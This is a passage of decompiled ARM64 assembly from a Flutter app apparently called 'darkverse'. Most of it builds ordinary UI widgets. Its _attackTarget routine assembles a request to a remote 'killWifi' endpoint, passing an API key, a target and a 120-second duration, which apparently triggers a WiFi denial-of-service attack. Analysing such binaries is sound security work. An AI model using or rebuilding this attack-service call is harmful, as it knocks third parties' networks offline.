    //     0x94c168: add             lr, PP, #0x37, lsl #12  ; [pp+0x376b8] Obj!EdgeInsets@a093e1
    //     0x94c16c: ldr             lr, [lr, #0x6b8]
    // 0x94c170: stp             lr, x16, [SP, #0x18]
    // 0x94c174: ldur            x16, [fp, #-0x20]
    // 0x94c178: r30 = 10.000000
    //     0x94c178: add             lr, PP, #0xc, lsl #12  ; [pp+0xc778] 10
    //     0x94c17c: ldr             lr, [lr, #0x778]
    // 0x94c180: stp             lr, x16, [SP, #8]
    // 0x94c184: str             x0, [SP]
    // 0x94c188: r1 = Instance_Color
    //     0x94c188: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c18c: ldr             x1, [x1, #0xd28]
    // 0x94c190: r4 = const [0, 0x6, 0x5, 0x1, elevation, 0x4, foregroundColor, 0x1, padding, 0x2, shadowColor, 0x5, shape, 0x3, null]
    //     0x94c190: add             x4, PP, #0x37, lsl #12  ; [pp+0x376c0] List(15) [0, 0x6, 0x5, 0x1, "elevation", 0x4, "foregroundColor", 0x1, "padding", 0x2, "shadowColor", 0x5, "shape", 0x3, Null]
    //     0x94c194: ldr             x4, [x4, #0x6c0]
    // 0x94c198: r0 = styleFrom()
    //     0x94c198: bl              #0x6a6e2c  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::styleFrom
    // 0x94c19c: stur            x0, [fp, #-8]
    // 0x94c1a0: r0 = ElevatedButton()
    //     0x94c1a0: bl              #0x6b0714  ; AllocateElevatedButtonStub -> ElevatedButton (size=0x40)
    // 0x94c1a4: mov             x1, x0
    // 0x94c1a8: ldur            x2, [fp, #-0x30]
    // 0x94c1ac: ldur            x3, [fp, #-0x38]
    // 0x94c1b0: ldur            x5, [fp, #-0x10]
    // 0x94c1b4: ldur            x6, [fp, #-8]
    // 0x94c1b8: stur            x0, [fp, #-8]
    // 0x94c1bc: r0 = ElevatedButton.icon()
    //     0x94c1bc: bl              #0x6b83a8  ; [package:flutter/src/material/elevated_button.dart] ElevatedButton::ElevatedButton.icon
    // 0x94c1c0: r0 = Center()
    //     0x94c1c0: bl              #0x641520  ; AllocateCenterStub -> Center (size=0x1c)
    // 0x94c1c4: mov             x2, x0
    // 0x94c1c8: r0 = Instance_Alignment
    //     0x94c1c8: ldr             x0, [PP, #0x6fa8]  ; [pp+0x6fa8] Obj!Alignment@a09cf1
    // 0x94c1cc: stur            x2, [fp, #-0x10]
    // 0x94c1d0: StoreField: r2->field_f = r0
    //     0x94c1d0: stur            w0, [x2, #0xf]
    // 0x94c1d4: ldur            x0, [fp, #-8]
    // 0x94c1d8: StoreField: r2->field_b = r0
    //     0x94c1d8: stur            w0, [x2, #0xb]
    // 0x94c1dc: ldur            x0, [fp, #-0x18]
    // 0x94c1e0: LoadField: r1 = r0->field_b
    //     0x94c1e0: ldur            w1, [x0, #0xb]
    // 0x94c1e4: LoadField: r3 = r0->field_f
    //     0x94c1e4: ldur            w3, [x0, #0xf]
    // 0x94c1e8: DecompressPointer r3
    //     0x94c1e8: add             x3, x3, HEAP, lsl #32
    // 0x94c1ec: LoadField: r4 = r3->field_b
    //     0x94c1ec: ldur            w4, [x3, #0xb]
    // 0x94c1f0: r3 = LoadInt32Instr(r1)
    //     0x94c1f0: sbfx            x3, x1, #1, #0x1f
    // 0x94c1f4: stur            x3, [fp, #-0x48]
    // 0x94c1f8: r1 = LoadInt32Instr(r4)
    //     0x94c1f8: sbfx            x1, x4, #1, #0x1f
    // 0x94c1fc: cmp             x3, x1
    // 0x94c200: b.ne            #0x94c20c
    // 0x94c204: mov             x1, x0
    // 0x94c208: r0 = _growToNextCapacity()
    //     0x94c208: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x94c20c: ldur            x2, [fp, #-0x18]
    // 0x94c210: ldur            x3, [fp, #-0x48]
    // 0x94c214: add             x0, x3, #1
    // 0x94c218: lsl             x1, x0, #1
    // 0x94c21c: StoreField: r2->field_b = r1
    //     0x94c21c: stur            w1, [x2, #0xb]
    // 0x94c220: LoadField: r1 = r2->field_f
    //     0x94c220: ldur            w1, [x2, #0xf]
    // 0x94c224: DecompressPointer r1
    //     0x94c224: add             x1, x1, HEAP, lsl #32
    // 0x94c228: ldur            x0, [fp, #-0x10]
    // 0x94c22c: ArrayStore: r1[r3] = r0  ; List_4
    //     0x94c22c: add             x25, x1, x3, lsl #2
    //     0x94c230: add             x25, x25, #0xf
    //     0x94c234: str             w0, [x25]
    //     0x94c238: tbz             w0, #0, #0x94c254
    //     0x94c23c: ldurb           w16, [x1, #-1]
    //     0x94c240: ldurb           w17, [x0, #-1]
    //     0x94c244: and             x16, x17, x16, lsr #2
    //     0x94c248: tst             x16, HEAP, lsr #32
    //     0x94c24c: b.eq            #0x94c254
    //     0x94c250: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x94c254: b               #0x94c25c
    // 0x94c258: mov             x2, x3
    // 0x94c25c: r0 = Column()
    //     0x94c25c: bl              #0x641538  ; AllocateColumnStub -> Column (size=0x38)
    // 0x94c260: mov             x1, x0
    // 0x94c264: r0 = Instance_Axis
    //     0x94c264: ldr             x0, [PP, #0x46d0]  ; [pp+0x46d0] Obj!Axis@a40801
    // 0x94c268: StoreField: r1->field_f = r0
    //     0x94c268: stur            w0, [x1, #0xf]
    // 0x94c26c: r0 = Instance_MainAxisAlignment
    //     0x94c26c: ldr             x0, [PP, #0x6f78]  ; [pp+0x6f78] Obj!MainAxisAlignment@a403c1
    // 0x94c270: StoreField: r1->field_13 = r0
    //     0x94c270: stur            w0, [x1, #0x13]
    // 0x94c274: r0 = Instance_MainAxisSize
    //     0x94c274: add             x0, PP, #0xc, lsl #12  ; [pp+0xcbc0] Obj!MainAxisSize@a403e1
    //     0x94c278: ldr             x0, [x0, #0xbc0]
    // 0x94c27c: ArrayStore: r1[0] = r0  ; List_4
    //     0x94c27c: stur            w0, [x1, #0x17]
    // 0x94c280: r0 = Instance_CrossAxisAlignment
    //     0x94c280: add             x0, PP, #0xc, lsl #12  ; [pp+0xcb50] Obj!CrossAxisAlignment@a40301
    //     0x94c284: ldr             x0, [x0, #0xb50]
    // 0x94c288: StoreField: r1->field_1b = r0
    //     0x94c288: stur            w0, [x1, #0x1b]
    // 0x94c28c: r0 = Instance_VerticalDirection
    //     0x94c28c: ldr             x0, [PP, #0x6f90]  ; [pp+0x6f90] Obj!VerticalDirection@a407a1
    // 0x94c290: StoreField: r1->field_23 = r0
    //     0x94c290: stur            w0, [x1, #0x23]
    // 0x94c294: r0 = Instance_Clip
    //     0x94c294: ldr             x0, [PP, #0x6f98]  ; [pp+0x6f98] Obj!Clip@a43d81
    // 0x94c298: StoreField: r1->field_2b = r0
    //     0x94c298: stur            w0, [x1, #0x2b]
    // 0x94c29c: StoreField: r1->field_2f = rZR
    //     0x94c29c: stur            xzr, [x1, #0x2f]
    // 0x94c2a0: ldur            x0, [fp, #-0x18]
    // 0x94c2a4: StoreField: r1->field_b = r0
    //     0x94c2a4: stur            w0, [x1, #0xb]
    // 0x94c2a8: ldur            x0, [fp, #-0x28]
    // 0x94c2ac: stur            x1, [fp, #-8]
    // 0x94c2b0: r0 = Padding()
    //     0x94c2b0: bl              #0x64152c  ; AllocatePaddingStub -> Padding (size=0x14)
    // 0x94c2b4: mov             x1, x0
    // 0x94c2b8: r0 = Instance_EdgeInsets
    //     0x94c2b8: add             x0, PP, #0x11, lsl #12  ; [pp+0x11e18] Obj!EdgeInsets@a06141
    //     0x94c2bc: ldr             x0, [x0, #0xe18]
    // 0x94c2c0: stur            x1, [fp, #-0x10]
    // 0x94c2c4: StoreField: r1->field_f = r0
    //     0x94c2c4: stur            w0, [x1, #0xf]
    // 0x94c2c8: ldur            x0, [fp, #-8]
    // 0x94c2cc: StoreField: r1->field_b = r0
    //     0x94c2cc: stur            w0, [x1, #0xb]
    // 0x94c2d0: r0 = Container()
    //     0x94c2d0: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x94c2d4: stur            x0, [fp, #-8]
    // 0x94c2d8: r16 = Instance_BoxDecoration
    //     0x94c2d8: add             x16, PP, #0x37, lsl #12  ; [pp+0x376c8] Obj!BoxDecoration@a2ad41
    //     0x94c2dc: ldr             x16, [x16, #0x6c8]
    // 0x94c2e0: ldur            lr, [fp, #-0x10]
    // 0x94c2e4: stp             lr, x16, [SP]
    // 0x94c2e8: mov             x1, x0
    // 0x94c2ec: r4 = const [0, 0x3, 0x2, 0x1, child, 0x2, decoration, 0x1, null]
    //     0x94c2ec: add             x4, PP, #0x14, lsl #12  ; [pp+0x148e8] List(9) [0, 0x3, 0x2, 0x1, "child", 0x2, "decoration", 0x1, Null]
    //     0x94c2f0: ldr             x4, [x4, #0x8e8]
    // 0x94c2f4: r0 = Container()
    //     0x94c2f4: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x94c2f8: r0 = Scaffold()
    //     0x94c2f8: bl              #0x6945f0  ; AllocateScaffoldStub -> Scaffold (size=0x78)
    // 0x94c2fc: ldur            x1, [fp, #-0x28]
    // 0x94c300: ArrayStore: r0[0] = r1  ; List_4
    //     0x94c300: stur            w1, [x0, #0x17]
    // 0x94c304: ldur            x1, [fp, #-8]
    // 0x94c308: StoreField: r0->field_1b = r1
    //     0x94c308: stur            w1, [x0, #0x1b]
    // 0x94c30c: r1 = Instance_AlignmentDirectional
    //     0x94c30c: add             x1, PP, #0xd, lsl #12  ; [pp+0xd168] Obj!AlignmentDirectional@a09c31
    //     0x94c310: ldr             x1, [x1, #0x168]
    // 0x94c314: StoreField: r0->field_2f = r1
    //     0x94c314: stur            w1, [x0, #0x2f]
    // 0x94c318: r1 = Instance_Color
    //     0x94c318: add             x1, PP, #0xb, lsl #12  ; [pp+0xbdc0] Obj!Color@a0e491
    //     0x94c31c: ldr             x1, [x1, #0xdc0]
    // 0x94c320: StoreField: r0->field_4f = r1
    //     0x94c320: stur            w1, [x0, #0x4f]
    // 0x94c324: r1 = true
    //     0x94c324: add             x1, NULL, #0x20  ; true
    // 0x94c328: StoreField: r0->field_5f = r1
    //     0x94c328: stur            w1, [x0, #0x5f]
    // 0x94c32c: r2 = Instance_DragStartBehavior
    //     0x94c32c: ldr             x2, [PP, #0x5090]  ; [pp+0x5090] Obj!DragStartBehavior@a418a1
    // 0x94c330: StoreField: r0->field_63 = r2
    //     0x94c330: stur            w2, [x0, #0x63]
    // 0x94c334: r2 = false
    //     0x94c334: add             x2, NULL, #0x30  ; false
    // 0x94c338: StoreField: r0->field_b = r2
    //     0x94c338: stur            w2, [x0, #0xb]
    // 0x94c33c: StoreField: r0->field_f = r1
    //     0x94c33c: stur            w1, [x0, #0xf]
    // 0x94c340: StoreField: r0->field_13 = r2
    //     0x94c340: stur            w2, [x0, #0x13]
    // 0x94c344: r2 = Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static.
    //     0x94c344: add             x2, PP, #0xd, lsl #12  ; [pp+0xd170] Closure: (BuildContext, Animation<double>) => Widget from Function '_defaultBottomSheetScrimBuilder@89420462': static. (0x75b335bba4)
    //     0x94c348: ldr             x2, [x2, #0x170]
    // 0x94c34c: StoreField: r0->field_4b = r2
    //     0x94c34c: stur            w2, [x0, #0x4b]
    // 0x94c350: StoreField: r0->field_6b = r1
    //     0x94c350: stur            w1, [x0, #0x6b]
    // 0x94c354: StoreField: r0->field_6f = r1
    //     0x94c354: stur            w1, [x0, #0x6f]
    // 0x94c358: LeaveFrame
    //     0x94c358: mov             SP, fp
    //     0x94c35c: ldp             fp, lr, [SP], #0x10
    // 0x94c360: ret
    //     0x94c360: ret             
    // 0x94c364: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94c364: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94c368: b               #0x94bc7c
  }
  _ _infoCard(/* No info */) {
    // ** addr: 0x94c36c, size: 0x23c
    // 0x94c36c: EnterFrame
    //     0x94c36c: stp             fp, lr, [SP, #-0x10]!
    //     0x94c370: mov             fp, SP
    // 0x94c374: AllocStack(0x40)
    //     0x94c374: sub             SP, SP, #0x40
    // 0x94c378: r0 = Instance_Color
    //     0x94c378: add             x0, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c37c: ldr             x0, [x0, #0xd28]
    // 0x94c380: mov             x4, x1
    // 0x94c384: stur            x1, [fp, #-8]
    // 0x94c388: stur            x2, [fp, #-0x10]
    // 0x94c38c: stur            x3, [fp, #-0x18]
    // 0x94c390: stur            x5, [fp, #-0x20]
    // 0x94c394: CheckStackOverflow
    //     0x94c394: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94c398: cmp             SP, x16
    //     0x94c39c: b.ls            #0x94c5a0
    // 0x94c3a0: mov             x1, x0
    // 0x94c3a4: d0 = 0.500000
    //     0x94c3a4: fmov            d0, #0.50000000
    // 0x94c3a8: r0 = withOpacity()
    //     0x94c3a8: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94c3ac: stur            x0, [fp, #-0x28]
    // 0x94c3b0: r0 = Radius()
    //     0x94c3b0: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94c3b4: d0 = 16.000000
    //     0x94c3b4: fmov            d0, #16.00000000
    // 0x94c3b8: stur            x0, [fp, #-0x30]
    // 0x94c3bc: StoreField: r0->field_7 = d0
    //     0x94c3bc: stur            d0, [x0, #7]
    // 0x94c3c0: StoreField: r0->field_f = d0
    //     0x94c3c0: stur            d0, [x0, #0xf]
    // 0x94c3c4: r0 = BorderRadius()
    //     0x94c3c4: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94c3c8: mov             x2, x0
    // 0x94c3cc: ldur            x0, [fp, #-0x30]
    // 0x94c3d0: stur            x2, [fp, #-0x38]
    // 0x94c3d4: StoreField: r2->field_7 = r0
    //     0x94c3d4: stur            w0, [x2, #7]
    // 0x94c3d8: StoreField: r2->field_b = r0
    //     0x94c3d8: stur            w0, [x2, #0xb]
    // 0x94c3dc: StoreField: r2->field_f = r0
    //     0x94c3dc: stur            w0, [x2, #0xf]
    // 0x94c3e0: StoreField: r2->field_13 = r0
    //     0x94c3e0: stur            w0, [x2, #0x13]
    // 0x94c3e4: r1 = Instance_Color
    //     0x94c3e4: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c3e8: ldr             x1, [x1, #0xd28]
    // 0x94c3ec: d0 = 0.200000
    //     0x94c3ec: add             x17, PP, #0xc, lsl #12  ; [pp+0xc150] IMM: double(0.2) from 0x3fc999999999999a
    //     0x94c3f0: ldr             d0, [x17, #0x150]
    // 0x94c3f4: r0 = withOpacity()
    //     0x94c3f4: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94c3f8: stur            x0, [fp, #-0x30]
    // 0x94c3fc: r0 = BorderSide()
    //     0x94c3fc: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x94c400: mov             x1, x0
    // 0x94c404: ldur            x0, [fp, #-0x30]
    // 0x94c408: stur            x1, [fp, #-0x40]
    // 0x94c40c: StoreField: r1->field_7 = r0
    //     0x94c40c: stur            w0, [x1, #7]
    // 0x94c410: d0 = 1.000000
    //     0x94c410: fmov            d0, #1.00000000
    // 0x94c414: StoreField: r1->field_b = d0
    //     0x94c414: stur            d0, [x1, #0xb]
    // 0x94c418: r0 = Instance_BorderStyle
    //     0x94c418: add             x0, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x94c41c: ldr             x0, [x0, #0xe40]
    // 0x94c420: StoreField: r1->field_13 = r0
    //     0x94c420: stur            w0, [x1, #0x13]
    // 0x94c424: d0 = -1.000000
    //     0x94c424: fmov            d0, #-1.00000000
    // 0x94c428: ArrayStore: r1[0] = d0  ; List_8
    //     0x94c428: stur            d0, [x1, #0x17]
    // 0x94c42c: r0 = RoundedRectangleBorder()
    //     0x94c42c: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x94c430: mov             x1, x0
    // 0x94c434: ldur            x0, [fp, #-0x38]
    // 0x94c438: stur            x1, [fp, #-0x30]
    // 0x94c43c: StoreField: r1->field_b = r0
    //     0x94c43c: stur            w0, [x1, #0xb]
    // 0x94c440: ldur            x0, [fp, #-0x40]
    // 0x94c444: StoreField: r1->field_7 = r0
    //     0x94c444: stur            w0, [x1, #7]
    // 0x94c448: r0 = Icon()
    //     0x94c448: bl              #0x6b0738  ; AllocateIconStub -> Icon (size=0x40)
    // 0x94c44c: mov             x1, x0
    // 0x94c450: ldur            x0, [fp, #-0x20]
    // 0x94c454: stur            x1, [fp, #-0x38]
    // 0x94c458: StoreField: r1->field_b = r0
    //     0x94c458: stur            w0, [x1, #0xb]
    // 0x94c45c: r0 = Instance_Color
    //     0x94c45c: add             x0, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94c460: ldr             x0, [x0, #0xd28]
    // 0x94c464: StoreField: r1->field_23 = r0
    //     0x94c464: stur            w0, [x1, #0x23]
    // 0x94c468: ldur            x0, [fp, #-8]
    // 0x94c46c: LoadField: r2 = r0->field_2b
    //     0x94c46c: ldur            w2, [x0, #0x2b]
    // 0x94c470: DecompressPointer r2
    //     0x94c470: add             x2, x2, HEAP, lsl #32
    // 0x94c474: stur            x2, [fp, #-0x20]
    // 0x94c478: r0 = TextStyle()
    //     0x94c478: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94c47c: mov             x1, x0
    // 0x94c480: r0 = true
    //     0x94c480: add             x0, NULL, #0x20  ; true
    // 0x94c484: stur            x1, [fp, #-8]
    // 0x94c488: StoreField: r1->field_7 = r0
    //     0x94c488: stur            w0, [x1, #7]
    // 0x94c48c: ldur            x2, [fp, #-0x20]
    // 0x94c490: StoreField: r1->field_b = r2
    //     0x94c490: stur            w2, [x1, #0xb]
    // 0x94c494: r3 = Instance_FontWeight
    //     0x94c494: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94c498: ldr             x3, [x3, #0xf08]
    // 0x94c49c: StoreField: r1->field_23 = r3
    //     0x94c49c: stur            w3, [x1, #0x23]
    // 0x94c4a0: r3 = "Orbitron"
    //     0x94c4a0: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94c4a4: ldr             x3, [x3, #0xf20]
    // 0x94c4a8: StoreField: r1->field_13 = r3
    //     0x94c4a8: stur            w3, [x1, #0x13]
    // 0x94c4ac: r0 = Text()
    //     0x94c4ac: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94c4b0: mov             x1, x0
    // 0x94c4b4: ldur            x0, [fp, #-0x10]
    // 0x94c4b8: stur            x1, [fp, #-0x40]
    // 0x94c4bc: StoreField: r1->field_b = r0
    //     0x94c4bc: stur            w0, [x1, #0xb]
    // 0x94c4c0: ldur            x0, [fp, #-8]
    // 0x94c4c4: StoreField: r1->field_13 = r0
    //     0x94c4c4: stur            w0, [x1, #0x13]
    // 0x94c4c8: r0 = TextStyle()
    //     0x94c4c8: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94c4cc: mov             x1, x0
    // 0x94c4d0: r0 = true
    //     0x94c4d0: add             x0, NULL, #0x20  ; true
    // 0x94c4d4: stur            x1, [fp, #-8]
    // 0x94c4d8: StoreField: r1->field_7 = r0
    //     0x94c4d8: stur            w0, [x1, #7]
    // 0x94c4dc: ldur            x2, [fp, #-0x20]
    // 0x94c4e0: StoreField: r1->field_b = r2
    //     0x94c4e0: stur            w2, [x1, #0xb]
    // 0x94c4e4: r2 = 16.000000
    //     0x94c4e4: add             x2, PP, #0x12, lsl #12  ; [pp+0x12008] 16
    //     0x94c4e8: ldr             x2, [x2, #8]
    // 0x94c4ec: StoreField: r1->field_1f = r2
    //     0x94c4ec: stur            w2, [x1, #0x1f]
    // 0x94c4f0: r0 = Text()
    //     0x94c4f0: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94c4f4: mov             x1, x0
    // 0x94c4f8: ldur            x0, [fp, #-0x18]
    // 0x94c4fc: stur            x1, [fp, #-0x10]
    // 0x94c500: StoreField: r1->field_b = r0
    //     0x94c500: stur            w0, [x1, #0xb]
    // 0x94c504: ldur            x0, [fp, #-8]
    // 0x94c508: StoreField: r1->field_13 = r0
    //     0x94c508: stur            w0, [x1, #0x13]
    // 0x94c50c: r0 = ListTile()
    //     0x94c50c: bl              #0x7a2b78  ; AllocateListTileStub -> ListTile (size=0xa0)
    // 0x94c510: mov             x1, x0
    // 0x94c514: ldur            x0, [fp, #-0x38]
    // 0x94c518: stur            x1, [fp, #-8]
    // 0x94c51c: StoreField: r1->field_b = r0
    //     0x94c51c: stur            w0, [x1, #0xb]
    // 0x94c520: ldur            x0, [fp, #-0x40]
    // 0x94c524: StoreField: r1->field_f = r0
    //     0x94c524: stur            w0, [x1, #0xf]
    // 0x94c528: ldur            x0, [fp, #-0x10]
    // 0x94c52c: StoreField: r1->field_13 = r0
    //     0x94c52c: stur            w0, [x1, #0x13]
    // 0x94c530: r0 = true
    //     0x94c530: add             x0, NULL, #0x20  ; true
    // 0x94c534: StoreField: r1->field_4b = r0
    //     0x94c534: stur            w0, [x1, #0x4b]
    // 0x94c538: r2 = false
    //     0x94c538: add             x2, NULL, #0x30  ; false
    // 0x94c53c: StoreField: r1->field_5f = r2
    //     0x94c53c: stur            w2, [x1, #0x5f]
    // 0x94c540: StoreField: r1->field_73 = r2
    //     0x94c540: stur            w2, [x1, #0x73]
    // 0x94c544: StoreField: r1->field_97 = r0
    //     0x94c544: stur            w0, [x1, #0x97]
    // 0x94c548: r0 = Card()
    //     0x94c548: bl              #0x82aab4  ; AllocateCardStub -> Card (size=0x38)
    // 0x94c54c: r1 = Instance_Color
    //     0x94c54c: add             x1, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x94c550: ldr             x1, [x1, #0x708]
    // 0x94c554: StoreField: r0->field_b = r1
    //     0x94c554: stur            w1, [x0, #0xb]
    // 0x94c558: ldur            x1, [fp, #-0x28]
    // 0x94c55c: StoreField: r0->field_f = r1
    //     0x94c55c: stur            w1, [x0, #0xf]
    // 0x94c560: r1 = 6.000000
    //     0x94c560: add             x1, PP, #0xd, lsl #12  ; [pp+0xdab8] 6
    //     0x94c564: ldr             x1, [x1, #0xab8]
    // 0x94c568: ArrayStore: r0[0] = r1  ; List_4
    //     0x94c568: stur            w1, [x0, #0x17]
    // 0x94c56c: ldur            x1, [fp, #-0x30]
    // 0x94c570: StoreField: r0->field_1b = r1
    //     0x94c570: stur            w1, [x0, #0x1b]
    // 0x94c574: r1 = true
    //     0x94c574: add             x1, NULL, #0x20  ; true
    // 0x94c578: StoreField: r0->field_1f = r1
    //     0x94c578: stur            w1, [x0, #0x1f]
    // 0x94c57c: ldur            x2, [fp, #-8]
    // 0x94c580: StoreField: r0->field_2f = r2
    //     0x94c580: stur            w2, [x0, #0x2f]
    // 0x94c584: StoreField: r0->field_2b = r1
    //     0x94c584: stur            w1, [x0, #0x2b]
    // 0x94c588: r1 = Instance__CardVariant
    //     0x94c588: add             x1, PP, #0x37, lsl #12  ; [pp+0x37728] Obj!_CardVariant@a41681
    //     0x94c58c: ldr             x1, [x1, #0x728]
    // 0x94c590: StoreField: r0->field_33 = r1
    //     0x94c590: stur            w1, [x0, #0x33]
    // 0x94c594: LeaveFrame
    //     0x94c594: mov             SP, fp
    //     0x94c598: ldp             fp, lr, [SP], #0x10
    // 0x94c59c: ret
    //     0x94c59c: ret             
    // 0x94c5a0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94c5a0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94c5a4: b               #0x94c3a0
  }
  [closure] Future<void> _attackTarget(dynamic) {
    // ** addr: 0x94c5a8, size: 0x38
    // 0x94c5a8: EnterFrame
    //     0x94c5a8: stp             fp, lr, [SP, #-0x10]!
    //     0x94c5ac: mov             fp, SP
    // 0x94c5b0: ldr             x0, [fp, #0x10]
    // 0x94c5b4: ArrayLoad: r1 = r0[0]  ; List_4
    //     0x94c5b4: ldur            w1, [x0, #0x17]
    // 0x94c5b8: DecompressPointer r1
    //     0x94c5b8: add             x1, x1, HEAP, lsl #32
    // 0x94c5bc: CheckStackOverflow
    //     0x94c5bc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94c5c0: cmp             SP, x16
    //     0x94c5c4: b.ls            #0x94c5d8
    // 0x94c5c8: r0 = _attackTarget()
    //     0x94c5c8: bl              #0x94c5e0  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_attackTarget
    // 0x94c5cc: LeaveFrame
    //     0x94c5cc: mov             SP, fp
    //     0x94c5d0: ldp             fp, lr, [SP], #0x10
    // 0x94c5d4: ret
    //     0x94c5d4: ret             
    // 0x94c5d8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94c5d8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94c5dc: b               #0x94c5c8
  }
  _ _attackTarget(/* No info */) async {
    // ** addr: 0x94c5e0, size: 0x21c
    // 0x94c5e0: EnterFrame
    //     0x94c5e0: stp             fp, lr, [SP, #-0x10]!
    //     0x94c5e4: mov             fp, SP
    // 0x94c5e8: AllocStack(0x98)
    //     0x94c5e8: sub             SP, SP, #0x98
    // 0x94c5ec: SetupParameters(_WifiInternalPageState this /* r1 => r1, fp-0x78 */)
    //     0x94c5ec: stur            NULL, [fp, #-8]
    //     0x94c5f0: stur            x1, [fp, #-0x78]
    // 0x94c5f4: CheckStackOverflow
    //     0x94c5f4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94c5f8: cmp             SP, x16
    //     0x94c5fc: b.ls            #0x94c7f0
    // 0x94c600: r1 = 1
    //     0x94c600: mov             x1, #1
    // 0x94c604: r0 = AllocateContext()
    //     0x94c604: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94c608: mov             x2, x0
    // 0x94c60c: ldur            x1, [fp, #-0x78]
    // 0x94c610: stur            x2, [fp, #-0x80]
    // 0x94c614: StoreField: r2->field_f = r1
    //     0x94c614: stur            w1, [x2, #0xf]
    // 0x94c618: InitAsync() -> Future<void?>
    //     0x94c618: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x94c61c: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x94c620: ldur            x2, [fp, #-0x80]
    // 0x94c624: r1 = Function '<anonymous closure>':.
    //     0x94c624: add             x1, PP, #0x37, lsl #12  ; [pp+0x376d0] AnonymousClosure: (0x6b14e4), in [package:darkverse/login_page.dart] _LoginPageState::login (0x6ab474)
    //     0x94c628: ldr             x1, [x1, #0x6d0]
    // 0x94c62c: r0 = AllocateClosure()
    //     0x94c62c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94c630: ldur            x1, [fp, #-0x78]
    // 0x94c634: mov             x2, x0
    // 0x94c638: r0 = setState()
    //     0x94c638: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x94c63c: r1 = Null
    //     0x94c63c: mov             x1, NULL
    // 0x94c640: r2 = 10
    //     0x94c640: mov             x2, #0xa
    // 0x94c644: r0 = AllocateArray()
    //     0x94c644: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94c648: r16 = "http://superdexapp.queen-official.com:2013/killWifi\?key="
    //     0x94c648: add             x16, PP, #0x37, lsl #12  ; [pp+0x376d8] "http://superdexapp.queen-official.com:2013/killWifi\?key="
    //     0x94c64c: ldr             x16, [x16, #0x6d8]
    // 0x94c650: StoreField: r0->field_f = r16
    //     0x94c650: stur            w16, [x0, #0xf]
    // 0x94c654: ldur            x1, [fp, #-0x78]
    // 0x94c658: LoadField: r2 = r1->field_b
    //     0x94c658: ldur            w2, [x1, #0xb]
    // 0x94c65c: DecompressPointer r2
    //     0x94c65c: add             x2, x2, HEAP, lsl #32
    // 0x94c660: cmp             w2, NULL
    // 0x94c664: b.eq            #0x94c7f8
    // 0x94c668: LoadField: r3 = r2->field_b
    //     0x94c668: ldur            w3, [x2, #0xb]
    // 0x94c66c: DecompressPointer r3
    //     0x94c66c: add             x3, x3, HEAP, lsl #32
    // 0x94c670: StoreField: r0->field_13 = r3
    //     0x94c670: stur            w3, [x0, #0x13]
    // 0x94c674: r16 = "&target="
    //     0x94c674: add             x16, PP, #0x14, lsl #12  ; [pp+0x142e8] "&target="
    //     0x94c678: ldr             x16, [x16, #0x2e8]
    // 0x94c67c: ArrayStore: r0[0] = r16  ; List_4
    //     0x94c67c: stur            w16, [x0, #0x17]
    // 0x94c680: LoadField: r2 = r1->field_13
    //     0x94c680: ldur            w2, [x1, #0x13]
    // 0x94c684: DecompressPointer r2
    //     0x94c684: add             x2, x2, HEAP, lsl #32
    // 0x94c688: StoreField: r0->field_1b = r2
    //     0x94c688: stur            w2, [x0, #0x1b]
    // 0x94c68c: r16 = "&duration=120"
    //     0x94c68c: add             x16, PP, #0x37, lsl #12  ; [pp+0x376e0] "&duration=120"
    //     0x94c690: ldr             x16, [x16, #0x6e0]
    // 0x94c694: StoreField: r0->field_1f = r16
    //     0x94c694: stur            w16, [x0, #0x1f]
    // 0x94c698: str             x0, [SP]
    // 0x94c69c: r0 = _interpolate()
    //     0x94c69c: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x94c6a0: mov             x1, x0
